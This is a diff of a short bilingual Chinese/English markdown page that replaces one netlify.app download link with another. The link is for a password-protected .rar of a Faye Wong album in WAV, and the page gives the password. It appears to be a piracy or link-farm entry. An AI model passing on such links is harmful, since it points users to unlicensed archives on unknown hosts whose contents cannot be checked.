@@ -1,5 +1,5 @@
 ## 下载地址(download link)
-[下载链接 download link](https://voluble-croquembouche-d321dc.netlify.app/?s=%E7%8E%8B%E8%8F%B2%E3%80%8A1994+COMING+HOME%28%E6%96%B0%E8%89%BA%E5%AE%9D24K+Gold%E9%87%91%E7%A2%9F%E7%89%88%29%E3%80%8B%5BWAV+%E6%95%B4%E8%BD%A8%5D.rar)
+[下载链接 download link](https://tutu365.netlify.app/?s=%E7%8E%8B%E8%8F%B2%E3%80%8A1994+COMING+HOME%28%E6%96%B0%E8%89%BA%E5%AE%9D24K+Gold%E9%87%91%E7%A2%9F%E7%89%88%29%E3%80%8B%5BWAV+%E6%95%B4%E8%BD%A8%5D.rar)
 
 ## 下载密码(download password)
 1866
